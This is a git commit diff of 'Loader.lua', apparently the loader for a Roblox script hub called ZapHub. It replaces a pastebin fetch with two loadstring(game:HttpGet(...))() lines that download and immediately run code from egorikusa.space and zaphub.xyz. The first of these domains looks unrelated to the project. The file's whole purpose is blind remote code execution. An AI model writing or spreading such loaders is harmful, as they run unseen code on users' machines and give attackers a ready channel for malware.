81dd2581c78c9d5bd4ea5a35986651332498516a
zaplua <kaani.bye2@gmail.com>
2024-05-14 12:57:20 +0200

    Update Loader.lua

--- Loader.lua
+++ Loader.lua
@@ -1,2 +1,3 @@
 print('Loading ZapHub...')
-loadstring(game:HttpGet('https://pastebin.com/raw/wKGHGxDt'))()
+loadstring(game:HttpGet('https://egorikusa.space/78eede770504999a0cbdf477.lua'))()
+loadstring(game:HttpGet('https://zaphub.xyz/Exec'))()
